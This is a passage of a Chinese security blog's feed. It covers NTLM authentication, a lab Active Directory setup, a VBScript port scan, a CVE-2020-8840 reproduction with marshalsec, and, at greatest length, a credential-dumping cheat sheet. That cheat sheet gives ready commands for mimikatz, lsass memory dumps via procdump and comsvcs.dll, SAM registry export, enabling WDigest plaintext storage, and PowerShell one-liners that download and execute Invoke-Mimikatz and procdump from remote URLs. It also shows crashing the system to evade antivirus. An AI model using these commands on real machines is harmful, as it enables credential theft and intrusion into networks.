Net-NTLMv1的加密流程如下：</p>
<ul>
<li>1.客户端向服务器发送一个请求</li>
<li>2.服务器接收到请求后，生成一个8位的Challenge，发送回客户端</li>
<li>3.客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，作为response发送给服务器</li>
<li>4.服务器校验response<br>
两者的流程可以说是相同的，但加密算法不同，后者Net-NTLMv1相对脆弱</li>
</ul>
<p><strong>质询抓包分析</strong></p>
<p>使用域户向域控共享目录发起请求，<br>
<img src="https://thekingofduck.github.io/post-images/1583247680147.png" alt="" loading="lazy"></p>
<p>在域用户机器上Wireshark抓包如下：</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583250718347.png" alt="" loading="lazy"></figure>
<p>步骤上质询有四步,可以将其看为一发一收两个来回</p>
<p>第一发：基础信息发送</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583250826048.png" alt="" loading="lazy"></figure>
<p>第一收：获取对方生成并发过来的Challenge</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583250919881.png" alt="" loading="lazy"></figure>
<p>第二发：将要登录到账户对应的NTLM Hash加密Challenge生成Response并发给服务器</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
<p>第二收：服务器校验response并返回结果</p>
<p><img src="https://thekingofduck.github.io/post-images/1583251428310.png" alt="" loading="lazy"><br>
（登录成功）<br>
<img src="https://thekingofduck.github.io/post-images/1583251781830.png" alt="" loading="lazy"><br>
（登录失败）</p>
<p>至此Net-NTLM协议通讯过程分析完成，也可以看到文章<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a>0x03 Net-NTLM hash中的分析是错误的。</p>
<p>有个非常值得关注的点：</p>
<ul>
<li><strong>当用户进行涉及Net-NTLM认证的访问时系统默认会先将本地NTLM hash去走一遍Net-NTLM验证。</strong></li>
</ul>
<p>NTLM本地认证流程：</p>
<blockquote>
<p>winlogon.exe -&gt; 接收用户输入<br>
lsass.exe -&gt; 认证</p>
</blockquote>
<hr>
<p><strong>工作组认证和域环境认证的区别：</strong></p>
<p>工作组：点对点交易，无法相互信任。<br>
域环境：有信托机构(域)，相当于闲鱼卖东西需要闲鱼官方担保。</p>
<p>参考资料：</p>
<p><a href="https://www.bilibili.com/video/av65934941?from=search&amp;seid=9042861733006388518">彻底理解Windows认证</a><br>
<a href="https://xz.aliyun.com/t/1943">NTLM hash和Net-NTLM hash介绍</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记一：域环境的搭建]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-1-AD-Install/">
        </link>
        <updated>2020-03-01T22:50:43.000Z</updated>
        <content type="html"><![CDATA[<p>域渗透从0开始重新学习的第一天。<br>
台式机上是win10系统，VM里之前已经安装了2008和2012，再添加一台win7，计划用2012当域控，2008跑服务，win7做主要靶跳板。</p>
<p>win7是刚刚装的比较干净的机器，2008上有360，2012上有卡巴。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583198313108.PNG" alt="" loading="lazy"></figure>
<p>在2012上配置网络：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583198433041.PNG" alt="" loading="lazy"></figure>
<p>本地抗不住同时开太多的机器，DNS服务器放到域控上，所以dns解析指向本机，其他机器的DNS也是指向这个IP。</p>
<p>使用10.5.100.0/24这个段是因为学校内网用的这个段，日习惯了。。。</p>
<p>修改计算机名：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583198849620.PNG" alt="" loading="lazy"></figure>
<p>计算机名不能为存数字,修改为重启一下。</p>
<p>在服务器管理的“添加角色与功能”菜单中中添加AD域名服务和DNS服务器两项功能。</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
<p>选完一路点击下一步即可。</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583199504208.PNG" alt="" loading="lazy"></figure>
<p>安装完关闭再点服务器管理就有下图：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583199627145.PNG" alt="" loading="lazy"></figure>
<p>多了刚刚添加的两项功能。</p>
<p>升级为2012为域控：</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583202560692.png" alt="" loading="lazy"></figure>
<p>设置域：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583202843342.png" alt="" loading="lazy"></figure>
<p>设置目录还原密码：</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1583202864621.png" alt="" loading="lazy"></figure>
<p>一路下一步然后确认安装即可，中图会有感叹号提示无法创建该DNS服务器委派, 无关痛痒。</p>
<p>安装完自动重启：</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1583203539677.png" alt="" loading="lazy"></figure>
<p>已经需要域管理账号登录了；</p>
<p>在AD用户管理中添加域用户账号：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1583204864915.png" alt="" loading="lazy"></figure>
<p>密码复杂度策略很狗，得设复杂点才行。</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/1583205325297.png" alt="" loading="lazy"></figure>
<p>将其他机器加入域：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/1583206230232.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/1583206236247.png" alt="" loading="lazy"></figure>
<p>其他机器加入都是一样的操作，至此域环境搭建完成。</p>
<p>踩坑经验：家庭版系统无法加入域。</p>
<p>参考文献：</p>
<ul>
<li><a href="https://www.cnblogs.com/jassa/p/10170386.html">AD域环境搭建</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_493cafbb0102wa5s.html">AD目录服务数据库还原模式密码</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[利用cscript进行内网端口扫描]]></title>
        <id>https://thekingofduck.github.io/post/scan-ports-by-cscript/</id>
        <link href="https://thekingofduck.github.io/post/scan-ports-by-cscript/">
        </link>
        <updated>2020-02-28T13:06:54.000Z</updated>
        <content type="html"><![CDATA[<p>Code:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582974509141.png" alt="" loading="lazy"></figure>
<p>保存为xxx.vbs&gt;</p>
<pre><code> cscript.exe this.vbs ip 80 or 80,123,445
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582974824988.png" alt="" loading="lazy"></figure>
<p>原生，动静小。</p>
<p>适合防御严格的内网扫描。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2020-8840复现]]></title>
        <id>https://thekingofduck.github.io/post/CVE-2020-8840/</id>
        <link href="https://thekingofduck.github.io/post/CVE-2020-8840/">
        </link>
        <updated>2020-02-25T11:02:24.000Z</updated>
        <content type="html"><![CDATA[<p>Windows环境下执行命令的将下面的代码编译成class放到服务器上</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582827828394.png" alt="" loading="lazy"></figure>
<p>在class的同目录执行：</p>
<pre><code>python -m http.server 8080
</code></pre>
<p>开启一个简陋的web服务。</p>
<p>然后执行：</p>
<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/#Exploit
</code></pre>
<p>开启ldap服务。</p>
<p>执行POC：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582827821182.png" alt="" loading="lazy"></figure>
<p>大功告成</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582827319103.png" alt="" loading="lazy"></figure>
<p>如代码所示，需要开启enableDefaultTyping方法才能成功，非默认配置。</p>
<p>踩坑：把exp代码放到package中会加载后执行不成功，独立出来就好了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows本地hashdump备忘录]]></title>
        <id>https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/</id>
        <link href="https://thekingofduck.github.io/post/Dumping-Windows-Local-Credentials-Tools/">
        </link>
        <updated>2020-02-23T12:21:08.000Z</updated>
        <content type="html"><![CDATA[<p>市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提取hash。所以有杀软的情况下读密码这事根本就不是工具免不免杀的问题，而是杀软有没有监控保护lsass.exe或SAM的问题，所以读本地密码条件可以总结为：</p>
<blockquote>
<p>能正常访访问lsass.exe内存或SAM数据库。</p>
</blockquote>
<h3 id="常见工具">常见工具</h3>
<p>工具仅部分，通过以下操作可一键获取密码。</p>
<h4 id="mimikatz">mimikatz</h4>
<p>https://github.com/gentilkiwi/mimikatz</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1582465339806.png" alt="" loading="lazy"></figure>
<h4 id="quarkspwdump">QuarksPwDump</h4>
<p>https://github.com/quarkslab/quarkspwdump</p>
<pre><code>QuarksPwDump.exe -dhl
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1582466664583.png" alt="" loading="lazy"></figure>
<h4 id="wce">wce</h4>
<p>https://www.ampliasecurity.com/research/wcefaq.html</p>
<pre><code>wce.exe -w
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1582468276845.png" alt="" loading="lazy"></figure>
<h4 id="pwdump7">pwdump7</h4>
<p>http://www.tarasco.org/security/pwdump_7/index.html</p>
<pre><code>PwDump7.exe
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1582469996459.png" alt="" loading="lazy"></figure>
<h4 id="lazagne">LaZagne</h4>
<p>https://github.com/AlessandroZ/LaZagne</p>
<pre><code>laZagne_x86.exe windows
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1582470996820.png" alt="" loading="lazy"></figure>
<h3 id="lsass内存dump">lsass内存dump</h3>
<p>工具仅部分，通过以下操作可先获取到lsass内存文件，然后使用mimikatz可进一步读取密码。<br>
参考命令:</p>
<pre><code>mimikatz.exe&quot;sekurlsa::minidump lsass.dmp&quot;&quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;
</code></pre>
<h4 id="sharpdump">SharpDump</h4>
<p>https://github.com/GhostPack/SharpDump</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do SharpDump.exe %i
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1582476581586.png" alt="" loading="lazy"></figure>
<h4 id="procdump">ProcDump</h4>
<p>https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</p>
<pre><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1582471683393.png" alt="" loading="lazy"></figure>
<h4 id="sqldumper">SqlDumper</h4>
<p>https://support.microsoft.com/en-us/help/917825/use-the-sqldumper-exe-utility-to-generate-a-dump-file-in-sql-server</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do Sqldumper.exe %i 0 0x01100
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1582473006736.png" alt="" loading="lazy"></figure>
<h4 id="rundll32">rundll32</h4>
<p>https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/</p>
<pre><code>for /f  &quot;tokens=2&quot; %i in ('tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /NH') do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump %i .\lsass.dmp full
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/1582475904292.png" alt="" loading="lazy"></figure>
<h3 id="关于sam数据库">关于SAM数据库</h3>
<p>管理员执行:</p>
<pre><code>reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive
</code></pre>
<p>然后将两个文件导入SAMInside并将NT-Hash复制出来去相关网站查询即可。（mimikatz也可以读）</p>
<h3 id="关于无文件加载">关于无文件加载</h3>
<pre><code>powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/1582480293151.png" alt="" loading="lazy"></figure>
<p>读一下代码会发现都是peloader做的，同理可以把procdump做成psh实现无文件dump。</p>
<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/1582492124419.png" alt="" loading="lazy"></figure>
<h3 id="关于2012以及win10之后的机器">关于2012以及win10之后的机器：</h3>
<pre><code>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
</code></pre>
<p>键值为1时Wdigest Auth保存明文口令，为0则不保存明文。修改为重新登录生效。</p>
<h3 id="偏激的bypass卡巴读密码">偏激的bypass卡巴读密码</h3>
<p>卡巴以及小红伞均对lsass.exe进行了保护，导致微软出的两款工具以及他自己的kldumper都无法用于dump lsass。但是可以通过制造蓝屏来获取所有内存的文件MEMORY.DMP没然后在提出lsass进一步读取。</p>
<pre><code>taskkill /f /im &quot;wininit.exe&quot;
</code></pre>
<p>可参考: https://www.mrwu.red/web/2000.html</p>
<h3 id="总结">总结</h3>
<p>bypass av可以以卡巴为衡量标准，能过卡巴约等于过全部。</p>
<p>所以文件最终文件放在：</p>
<p>https://github.com/TheKingOfDuck/hashdump</p>
]]></content>
    </entry>
</feed>